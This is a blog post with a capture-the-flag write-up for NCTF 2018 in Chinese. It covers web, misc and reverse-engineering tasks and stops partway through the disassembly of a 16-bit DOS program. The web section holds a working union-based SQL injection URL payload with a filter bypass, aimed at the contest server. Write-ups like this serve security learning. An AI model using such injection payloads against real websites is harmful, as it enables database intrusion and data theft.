<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2018NCTF解题思路 - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#签到题"><span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#滴！晨跑打卡"><span class="toc-text">滴！晨跑打卡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CalcNow"><span class="toc-text">CalcNow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后门后门后门"><span class="toc-text">后门后门后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Our-16bit-wars"><span class="toc-text">Our 16bit wars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本操作-Reverse-Version"><span class="toc-text">基本操作 ~Reverse Version.~</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sendyouflag"><span class="toc-text">sendyouflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sendyousomething"><span class="toc-text">sendyousomething</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMALL-bug-I"><span class="toc-text">SMALL bug I</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2018NCTF解题思路
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2018-11-26 23:46:28</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>做的不是太好<br><a id="more"></a></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>打开之后发现是一个百度的页面，查看源代码也发现不了什么，又打开一次发现url出现了快速的转变，于是抓包拦截</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">header头：</span><br><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> ctfgame.acdxvfsvd.<span class="string">net:</span><span class="number">20002</span></span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">User-<span class="string">Agent:</span> Mozilla<span class="regexp">/5.0 (X11; Linux x86_64) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome<span class="regexp">/70.0.3538.77 Safari/</span><span class="number">537.36</span></span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Cookie:</span> nctf2018=where+is+flag%<span class="number">3</span>F; IS_STATIC=<span class="number">1</span></span><br><span class="line"><span class="string">Connection:</span> close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应头：</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="string">Date:</span> Mon, <span class="number">26</span> Nov <span class="number">2018</span> <span class="number">14</span>:<span class="number">28</span>:<span class="number">02</span> GMT</span><br><span class="line"><span class="string">Server:</span> Apache/<span class="number">2.4</span><span class="number">.18</span> (Ubuntu)</span><br><span class="line"><span class="string">nctf2018:</span> flag&#123;w3lc0m3_t0_nctf2018hhhhhhhhhhhh&#125;</span><br><span class="line"><span class="string">location:</span> ./secret.php</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">22</span></span><br><span class="line"><span class="string">Connection:</span> close</span><br><span class="line">Content-<span class="string">Type:</span> text/html; charset=UTF<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">flag&#123;this_is_not_flag&#125;</span><br></pre></td></tr></table></figure>
<p>flag：flag{w3lc0m3_t0_nctf2018hhhhhhhhhhhh}</p>
<h3 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h3><p>打开之后发现页面有一个输入框，于是测试，输入查询序号可以单独列出来，经过测试发现输入单引号会报错，所以可以判断存在SQL注入，又经过一番测试之后，发现空格被过滤了，我们可以用%a0来绕过，可以利用union注入将flag输出在页面上，payload如下：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据库：information_schema,cgctf,flaaaaaaag,mysql,performance_schema</span><br><span class="line"></span><br><span class="line">flaaaaaaag中的表：f<span class="number">144444444</span>g</span><br><span class="line">f<span class="number">144444444</span>g中的列：th<span class="number">1</span>s_<span class="number">1</span>s_flag</span><br><span class="line"></span><br><span class="line">输出flapayload：</span><br><span class="line">http://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?id=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%a0union</span><span class="symbol">%a0select</span><span class="symbol">%a01</span>,(<span class="keyword">select</span><span class="symbol">%a0th1s_1s_flag</span><span class="symbol">%a0from</span><span class="symbol">%a0flaaaaaaag.f144444444g</span>),<span class="number">3</span><span class="symbol">%a0and</span><span class="symbol">%a0</span><span class="symbol">%271</span><span class="symbol">%27</span>=<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>
<p>flag：nctf{this_1s_paocao_sqllllll}</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CalcNow"><a href="#CalcNow" class="headerlink" title="CalcNow"></a>CalcNow</h3><p>题目给了一个“nc ctfgame.acdxvfsvd.net 30003”，nc一波看看，发现是给你一个算式，让你算出答案然后输入进去，但是输入的时间有限制，需要写脚本去跑，经过测试，发现运算符号有“sub、add、mul、xor”，这是汇编语言中的指令，分别对应于减法、加法、乘法、亦或，脚本如下：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(<span class="string">"ctfgame.acdxvfsvd.net"</span>,30003)</span><br><span class="line">r.recv()</span><br><span class="line">Token = <span class="string">"Wl9anMOc6jNZNZo0H53t448RpcSkRPuU"</span></span><br><span class="line">r.sendline(Token)</span><br><span class="line">r.recv()</span><br><span class="line">str1 = r.recv()</span><br><span class="line">str2 = str1.split(<span class="string">" "</span>)</span><br><span class="line">a = eval(str2[0])</span><br><span class="line">op = str2[1]</span><br><span class="line">b = eval(str2[2])</span><br><span class="line"></span><br><span class="line">if op==<span class="string">"xor"</span>:</span><br><span class="line">	res = a^b</span><br><span class="line">elif op==<span class="string">"add"</span>:</span><br><span class="line">	res = a+b</span><br><span class="line">elif op==<span class="string">"mul"</span>:</span><br><span class="line">	res = a*b</span><br><span class="line">elif op==<span class="string">"sub"</span>:</span><br><span class="line">	res = a-b</span><br><span class="line">r.sendline(str(res))</span><br><span class="line">print r.recvall()</span><br></pre></td></tr></table></figure>
<p>out：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wxm@wxm-PC:~/Desktop$ python test.py </span><br><span class="line">[+] Opening<span class="built_in"> connection </span><span class="keyword">to</span> ctfgame.acdxvfsvd.net on<span class="built_in"> port </span>30003: Done</span><br><span class="line">[+] Receiving all data: Done (129B)</span><br><span class="line">[*] Closed<span class="built_in"> connection </span><span class="keyword">to</span> ctfgame.acdxvfsvd.net<span class="built_in"> port </span>30003</span><br><span class="line">Give me the result <span class="keyword">in</span> 2 seconds: SUCCESS</span><br><span class="line">Here is the flag</span><br><span class="line">NCTF&#123;afbc4b573ca4089d52cffd3b66c83c57499190da14665fed9cfa910496db34aa&#125;</span><br><span class="line"></span><br><span class="line">wxm@wxm-PC:~/Desktop$</span><br></pre></td></tr></table></figure>
<p>flag：NCTF{afbc4b573ca4089d52cffd3b66c83c57499190da14665fed9cfa910496db34aa}</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="后门后门后门"><a href="#后门后门后门" class="headerlink" title="后门后门后门"></a>后门后门后门</h3><p>64位可执行程序，没有加壳，运行发现陷入无线循环让你计算答案，载入IDA64中查看main函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="keyword">while</span> ( count != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (<span class="keyword">unsigned</span> __int8)rand();</span><br><span class="line">    v5 = (<span class="keyword">unsigned</span> __int8)rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d + %d = "</span>, v6, v5);</span><br><span class="line">    v4 = ret2num();</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">23333</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      hereisyourflag();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 + v5 == v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you win,but it's missing something"</span>);</span><br><span class="line">      ++count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"what?????"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"hao huo zhi,your math is feichang good!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以直观的查看，我们陷入循环是在welcome函数中，接着往下分析，在while循环中，会先让用户输入一个数，如果这个数等于23333的话，会进入hereisyourflag，，查看这个函数：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">int hereisyourflag(void)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">v1</span> = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">  v2 = <span class="number">125</span><span class="comment">;</span></span><br><span class="line">  v3 = <span class="number">100</span><span class="comment">;</span></span><br><span class="line">  v4 = <span class="number">108</span><span class="comment">;</span></span><br><span class="line">  v5 = <span class="number">114</span><span class="comment">;</span></span><br><span class="line">  v6 = <span class="number">111</span><span class="comment">;</span></span><br><span class="line">  v7 = <span class="number">119</span><span class="comment">;</span></span><br><span class="line">  v8 = <span class="number">95</span><span class="comment">;</span></span><br><span class="line">  v9 = <span class="number">115</span><span class="comment">;</span></span><br><span class="line">  v10 = <span class="number">39</span><span class="comment">;</span></span><br><span class="line">  v11 = <span class="number">121</span><span class="comment">;</span></span><br><span class="line">  v12 = <span class="number">114</span><span class="comment">;</span></span><br><span class="line">  v13 = <span class="number">97</span><span class="comment">;</span></span><br><span class="line">  v14 = <span class="number">110</span><span class="comment">;</span></span><br><span class="line">  v15 = <span class="number">105</span><span class="comment">;</span></span><br><span class="line">  v16 = <span class="number">98</span><span class="comment">;</span></span><br><span class="line">  v17 = <span class="number">95</span><span class="comment">;</span></span><br><span class="line">  v18 = <span class="number">111</span><span class="comment">;</span></span><br><span class="line">  v19 = <span class="number">116</span><span class="comment">;</span></span><br><span class="line">  v20 = <span class="number">95</span><span class="comment">;</span></span><br><span class="line">  v21 = <span class="number">101</span><span class="comment">;</span></span><br><span class="line">  v22 = <span class="number">109</span><span class="comment">;</span></span><br><span class="line">  v23 = <span class="number">111</span><span class="comment">;</span></span><br><span class="line">  v24 = <span class="number">99</span><span class="comment">;</span></span><br><span class="line">  v25 = <span class="number">108</span><span class="comment">;</span></span><br><span class="line">  v26 = <span class="number">101</span><span class="comment">;</span></span><br><span class="line">  v27 = <span class="number">87</span><span class="comment">;</span></span><br><span class="line">  v28 = <span class="number">123</span><span class="comment">;</span></span><br><span class="line">  v29 = <span class="number">102</span><span class="comment">;</span></span><br><span class="line">  v30 = <span class="number">116</span><span class="comment">;</span></span><br><span class="line">  v31 = <span class="number">99</span><span class="comment">;</span></span><br><span class="line">  v32 = <span class="number">110</span><span class="comment">;</span></span><br><span class="line">  for ( i = <span class="number">0</span><span class="comment">; i &lt;= 15; ++i )</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;<span class="built_in">v1</span> + i) ^= *(&amp;<span class="built_in">v1</span> + <span class="number">31</span> - i)<span class="comment">;</span></span><br><span class="line">    *(&amp;<span class="built_in">v1</span> + <span class="number">31</span> - i) ^= *(&amp;<span class="built_in">v1</span> + i)<span class="comment">;</span></span><br><span class="line">    *(&amp;<span class="built_in">v1</span> + i) ^= *(&amp;<span class="built_in">v1</span> + <span class="number">31</span> - i)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  return printf(<span class="string">"here is your real flag:%s\n"</span>, &amp;<span class="built_in">v1</span>)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过这个函数中的for循环后，flag会计算出来，庆幸的是我们可以还原这个函数，而不用让程序走到这个函数，脚本如下：</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">0</span>,<span class="number">125</span>,<span class="number">100</span>,<span class="number">108</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">95</span>, <span class="number">115</span>,<span class="number">39</span>,<span class="number">121</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">95</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">99</span>, <span class="number">108</span>, <span class="number">101</span>,<span class="number">87</span>,<span class="number">123</span>,<span class="number">102</span>,<span class="number">116</span>,<span class="number">99</span>,<span class="number">110</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">16</span>):</span><br><span class="line">    list1[<span class="built_in">i</span>]^=list1[<span class="number">31</span>-<span class="built_in">i</span>]</span><br><span class="line">    list1[<span class="number">31</span>-<span class="built_in">i</span>]^=list1[<span class="built_in">i</span>]</span><br><span class="line">    list1[<span class="built_in">i</span>]^=list1[<span class="number">31</span>-<span class="built_in">i</span>]</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x in range(<span class="number">31</span>):</span><br><span class="line">    flag+=chr(list1[x])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<p>flag：nctf{Welcome_to_binary’s_world}</p>
<h3 id="Our-16bit-wars"><a href="#Our-16bit-wars" class="headerlink" title="Our 16bit wars"></a>Our 16bit wars</h3><p>题目说该程序是16位程序，之前我也没见过，现百度现做，IDA载入发现也没几个函数，一个一个来看，start函数调用sub_100AC函数：</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">seg001:<span class="number">000</span>C sub_100AC       <span class="keyword">proc</span><span class="title"> near</span>               ;<span class="title"> CODE</span> XREF:<span class="title"> start+5↑p</span></span><br><span class="line"><span class="title">seg001:000C</span> <span class="title">                mov</span> <span class="title">    di,</span> 3</span><br><span class="line">seg001:000F<span class="title">                 call</span> <span class="title">   sub_10115</span></span><br><span class="line"><span class="title">seg001:0012</span> <span class="title">                mov</span> <span class="title">    di,</span> 24h ; '$'</span><br><span class="line">seg001:0015<span class="title">                 call</span> <span class="title">   sub_10123</span></span><br><span class="line"><span class="title">seg001:0018</span> <span class="title">                mov</span> <span class="title">    bx,</span> 24h ; '$'</span><br><span class="line">seg001:001B<span class="title">                 add</span> <span class="title">    bx,</span> 1</span><br><span class="line">seg001:001E<span class="title">                 cmp</span> <span class="title">    byte</span> ptr [bx], 23h</span><br><span class="line">seg001:0021<span class="title">                 jnz</span> <span class="title">    short</span> loc_100DD</span><br><span class="line">seg001:0023<span class="title">                 mov</span> <span class="title">    di,</span> 26h ; '&amp;'</span><br><span class="line">seg001:0026<span class="title">                 call</span> <span class="title">   sub_100F9</span></span><br><span class="line"><span class="title">seg001:0029</span> <span class="title">                mov</span> <span class="title">    si,</span> 76h ; 'v'</span><br><span class="line">seg001:002C<span class="title">                 mov</span> <span class="title">    dx,</span> 23h ; '#'</span><br><span class="line">seg001:002F<span class="title">                 call</span> <span class="title">   sub_100E4</span></span><br><span class="line"><span class="title">seg001:0032</span> <span class="title">                test</span> <span class="title">   ax,</span> ax</span><br><span class="line">seg001:0034<span class="title">                 jnz</span> <span class="title">    short</span> loc_100DD</span><br><span class="line">seg001:0036<span class="title">                 mov</span> <span class="title">    di,</span> 0Fh</span><br><span class="line">seg001:0039<span class="title">                 call</span> <span class="title">   sub_10115</span></span><br><span class="line"><span class="title">seg001:003C</span> <span class="title">                retn</span></span><br><span class="line"><span class="title">seg001:003D</span> ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:003D</span><br><span class="line">seg001:003D<span class="title"> loc_100DD:</span>                              ;<span class="title"> CODE</span> XREF:<span class="title"> sub_100AC+15↑j</span></span><br><span class="line"><span class="title">seg001:003D</span>                                         ;<span class="title"> sub_100AC+28↑j</span></span><br><span class="line"><span class="title">seg001:003D</span> <span class="title">                mov</span> <span class="title">    di,</span> 18h</span><br><span class="line">seg001:0040<span class="title">                 call</span> <span class="title">   sub_10115</span></span><br><span class="line"><span class="title">seg001:0043</span> <span class="title">                retn</span></span><br><span class="line"><span class="title">seg001:0043</span> sub_100AC<span class="title">       endp</span></span><br></pre></td></tr></table></figure>
<p>我认为其实这个函数相当于main函数吧，这个函数现调用sub_10115这个函数：</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">seg001:<span class="number">0075</span> sub_10115       <span class="keyword">proc</span><span class="title"> near</span>               ;<span class="title"> CODE</span> XREF:<span class="title"> sub_100AC+3↑p</span></span><br><span class="line"><span class="title">seg001:0075</span>                                         ;<span class="title"> sub_100AC+2D↑p</span> ...</span><br><span class="line">seg001:0075<span class="title">                 mov</span> <span class="title">    dx,</span> di</span><br><span class="line">seg001:0077<span class="title">                 mov</span> <span class="title">    ah,</span> 9</span><br><span class="line">seg001:0079<span class="title">                 int</span>     21h             ;<span class="title"> DOS</span> -<span class="title"> PRINT</span> STRING</span><br><span class="line">seg001:0079                                         ;<span class="title"> DS:DX</span> -&gt;<span class="title"> string</span> terminated<span class="title"> by</span> "$"</span><br><span class="line">seg001:007B<span class="title">                 mov</span> <span class="title">    dx,</span> 0</span><br><span class="line">seg001:007E<span class="title">                 mov</span> <span class="title">    ah,</span> 9</span><br><span class="line">seg001:0080<span class="title">                 int</span>     21h             ;<span class="title"> DOS</span> -<span class="title"> PRINT</span> STRING</span><br><span class="line">seg001:0080                                         ;<span class="title"> DS:DX</span> -&gt;<span class="title"> string</span> terminated<span class="title"> by</span> "$"</span><br><span class="line">seg001:0082<span class="title">                 retn</span></span><br><span class="line"><span class="title">seg001:0082</span> sub_10115<span class="title">       endp</span></span><br></pre></td></tr></table></figure>
<p></p><p>这个函数是输出函数，输出指定的字符串，再输出一个“\n”，这里说一下“int 21h”，“int 21h”是系统调用，与”mov ah，xx;“配合使用，这里讲ah设置位9的意思是输出字符串，其他的请看：<a href="https://blog.csdn.net/trochiluses/article/details/20008631，这个函数输出input" target="_blank" rel="noopener">https://blog.csdn.net/trochiluses/article/details/20008631，这个函数输出input</a> flag:</p><p></p>
<p></p><p>接着执行sub_10123函数:</p><p></p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">seg001:<span class="number">0083</span> sub_10123       <span class="keyword">proc</span><span class="title"> near</span>               ;<span class="title"> CODE</span> XREF:<span class="title"> sub_100AC+9↑p</span></span><br><span class="line"><span class="title">seg001:0083</span> <span class="title">                mov</span> <span class="title">    dx,</span> di</span><br><span class="line">seg001:0085<span class="title">                 mov</span> <span class="title">    ah,</span> 0Ah</span><br><span class="line">seg001:0087<span class="title">                 int</span>     21h             ;<span class="title"> DOS</span> -<span class="title"> BUFFERED</span> KEYBOARD<span class="title"> INPUT</span></span><br><span class="line"><span class="title">seg001:0087</span>                                         ;<span class="title"> DS:DX</span> -&gt;<span class="title"> buffer</span></span><br><span class="line"><span class="title">seg001:0089</span> <span class="title">                mov</span> <span class="title">    bx,</span> di</span><br><span class="line">seg001:008B<span class="title">                 add</span> <span class="title">    bx,</span> 1</span><br><span class="line">seg001:008E<span class="title">                 xor</span> <span class="title">    cx,</span> cx</span><br><span class="line">seg001:0090<span class="title">                 mov</span> <span class="title">    cl,</span> [bx]</span><br><span class="line">seg001:0092<span class="title">                 add</span> <span class="title">    bx,</span> cx</span><br><span class="line">seg001:0094<span class="title">                 add</span> <span class="title">    bx,</span> 1</span><br><span class="line">seg001:0097<span class="title">                 mov</span> <span class="title">    byte</span> ptr [bx], 24h ; '$'</span><br><span class="line">seg001:009A<span class="title">                 mov</span> <span class="title">    dx,</span> 0</span><br><span class="line">seg001:009D<span class="title">                 mov</span> <span class="title">    ah,</span> 9</span><br><span class="line">seg001:009F<span class="title">                 int</span>     21h             ;<span class="title"> DOS</span> -<span class="title"> PRINT</span> STRING</span><br><span class="line">seg001:009F                                         ;<span class="title"> DS:DX</span> -&gt;<span class="title"> string</span> terminated<span class="title"> by</span> "$"</span><br><span class="line">seg001:00A1<span class="title">                 retn</span></span><br><span class="line"><span class="title">seg001:00A1</span> sub_10123<span class="title">       endp</span></span><br></pre></td></tr></table></figure>
